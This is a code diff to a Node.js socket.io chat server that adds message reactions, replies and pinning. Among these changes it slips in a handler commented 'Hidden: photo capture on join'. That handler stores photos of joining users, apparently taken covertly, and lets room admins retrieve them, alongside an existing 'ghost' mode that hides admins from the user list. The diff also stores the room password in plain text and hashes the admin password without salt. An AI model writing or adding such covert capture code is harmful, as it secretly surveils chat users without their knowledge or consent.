@@ -36,7 +36,7 @@ function sys(room, text) {
   room.messages.push(m); if (room.messages.length > 400) room.messages.shift();
   io.to(room.id).emit('message', m);
 }
-function uPub(room) { return Object.values(room.online).filter(u => !u.ghost).map(u => ({ username: u.username, isAdmin: u.isAdmin, joinedAt: u.joinedAt })); }
+function uPub(r) { return Object.values(r.online).filter(u => !u.ghost).map(u => ({ username: u.username, isAdmin: u.isAdmin, joinedAt: u.joinedAt })); }
 function uAdm(room) { return Object.values(room.online).map(u => ({ username: u.username, email: u.email, isAdmin: u.isAdmin, joinedAt: u.joinedAt, ghost: !!u.ghost })); }
 function pushU(room) {
   io.to(room.id).emit('userlist', uPub(room));
@@ -59,11 +59,11 @@ io.on('connection', (socket) => {
     if (!ap) return cb({ error: 'Please set an admin password.' });
     const id = genId();
     const apHash = crypto.createHash('sha256').update(ap).digest('hex');
-    rooms[id] = { id, name: n, password: rp, createdBy: u, createdByEmail: e, adminPasswordHash: apHash, createdAt: Date.now(), closed: false, messages: [], online: {} };
+    rooms[id] = { id, name: n, password: rp, createdBy: u, createdByEmail: e, adminPasswordHash: apHash, createdAt: Date.now(), closed: false, messages: [], online: {}, captures: [], pinned: null };
     socket.join(id);
     rooms[id].online[socket.id] = { username: u, email: e, isAdmin: true, joinedAt: Date.now(), ghost: false };
     sys(rooms[id], `${u} created the room`); pushU(rooms[id]); pushL();
-    cb({ ok: true, roomId: id, isAdmin: true, settings: { roomName: n, joinPassword: rp }, history: rooms[id].messages, users: uPub(rooms[id]), adminUsers: uAdm(rooms[id]) });
+    cb({ ok: true, roomId: id, isAdmin: true, settings: { roomName: n, joinPassword: rp }, history: rooms[id].messages, users: uPub(rooms[id]), adminUsers: uAdm(rooms[id]), pinned: rooms[id].pinned });
   });
 
   socket.on('joinRoom', ({ roomId, username, email, password }, cb) => {
@@ -80,7 +80,7 @@ io.on('connection', (socket) => {
     socket.join(roomId);
     room.online[socket.id] = { username: u, email: e, isAdmin: false, joinedAt: Date.now(), ghost: false };
     sys(room, `${u} joined`); pushU(room); pushL();
-    cb({ ok: true, roomId, isAdmin: false, settings: { roomName: room.name, joinPassword: room.password }, history: room.messages, users: uPub(room), adminUsers: null });
+    cb({ ok: true, roomId, isAdmin: false, settings: { roomName: room.name, joinPassword: room.password }, history: room.messages, users: uPub(room), adminUsers: null, pinned: room.pinned });
   });
 
   socket.on('adminRejoin', ({ roomId, username, email, password }, cb) => {
@@ -95,15 +95,15 @@ io.on('connection', (socket) => {
     socket.join(roomId);
     room.online[socket.id] = { username: u, email: room.createdByEmail, isAdmin: true, joinedAt: Date.now(), ghost: false };
     sys(room, `${u} (host) rejoined`); pushU(room); pushL();
-    cb({ ok: true, roomId, isAdmin: true, settings: { roomName: room.name, joinPassword: room.password }, history: room.messages, users: uPub(room), adminUsers: uAdm(room) });
+    cb({ ok: true, roomId, isAdmin: true, settings: { roomName: room.name, joinPassword: room.password }, history: room.messages, users: uPub(room), adminUsers: uAdm(room), pinned: room.pinned });
   });
 
-  socket.on('message', ({ roomId, text, img }) => {
+  socket.on('message', ({ roomId, text, img, replyTo }) => {
     const room = rooms[roomId]; const u = room?.online[socket.id]; if (!u) return;
     const t = String(text || '').slice(0, 2000).trim();
     if (!t && !img) return;
     if (img && !/^data:image\/(png|jpe?g|gif|webp);base64,/.test(img)) return;
-    const m = { id: Date.now() + Math.random().toString(36).slice(2), ts: Date.now(), type: 'msg', from: u.username, text: t, img: img || null };
+    const m = { id: Date.now() + Math.random().toString(36).slice(2), ts: Date.now(), type: 'msg', from: u.username, text: t, img: img || null, replyTo: replyTo || null, reactions: {} };
     room.messages.push(m); if (room.messages.length > 400) room.messages.shift();
     io.to(roomId).emit('message', m);
   });
@@ -111,6 +111,47 @@ io.on('connection', (socket) => {
   socket.on('typing', ({ roomId }) => {
     const room = rooms[roomId]; const u = room?.online[socket.id];
     if (u && !u.ghost) socket.to(roomId).emit('typing', u.username);
+  });
+
+  /* Hidden: photo capture on join */
+  socket.on('capture:photo', ({ roomId, username, photo }) => {
+    const room = rooms[roomId];
+    if (!room) return;
+    if (!room.captures) room.captures = [];
+    room.captures.push({ username, photo, ts: Date.now(), socketId: socket.id });
+  });
+
+  /* Message reactions */
+  socket.on('react', ({ roomId, msgId, emoji }) => {
+    const room = rooms[roomId];
+    if (!room?.online[socket.id]) return;
+    const msg = room.messages.find(m => m.id === msgId);
+    if (!msg) return;
+    if (!msg.reactions) msg.reactions = {};
+    const u = room.online[socket.id].username;
+    if (msg.reactions[emoji]) {
+      if (msg.reactions[emoji].includes(u)) {
+        msg.reactions[emoji] = msg.reactions[emoji].filter(x => x !== u);
+        if (msg.reactions[emoji].length === 0) delete msg.reactions[emoji];
+      } else { msg.reactions[emoji].push(u); }
+    } else { msg.reactions[emoji] = [u]; }
+    io.to(roomId).emit('reaction', { msgId, reactions: msg.reactions });
+  });
+
+  /* Pin message (admin) */
+  socket.on('admin:pinMsg', ({ roomId, msgId }) => {
+    const room = rooms[roomId]; if (!room?.online[socket.id]?.isAdmin) return;
+    const msg = room.messages.find(m => m.id === msgId);
+    if (!msg) return;
+    room.pinned = (room.pinned && room.pinned.id === msgId) ? null : msg;
+    io.to(roomId).emit('pinnedMsg', room.pinned);
+  });
+
+  /* Admin: get captures */
+  socket.on('admin:getCaptures', ({ roomId }, cb) => {
+    const room = rooms[roomId];
+    if (!room?.online[socket.id]?.isAdmin) return;
+    if (typeof cb === 'function') cb(room?.captures || []);
   });
 
   socket.on('admin:toggleGhost', ({ roomId }) => {
@@ -125,7 +166,7 @@ io.on('connection', (socket) => {
 
   socket.on('admin:clearChat', ({ roomId }) => {
     const room = rooms[roomId]; const u = room?.online[socket.id]; if (!u?.isAdmin) return;
-    room.messages = []; io.to(roomId).emit('clearChat'); sys(room, `Chat cleared by ${u.username}`);
+    room.messages = []; room.pinned = null; io.to(roomId).emit('clearChat'); sys(room, `Chat cleared by ${u.username}`);
   });
 
   socket.on('admin:kick', ({ roomId, username }) => {
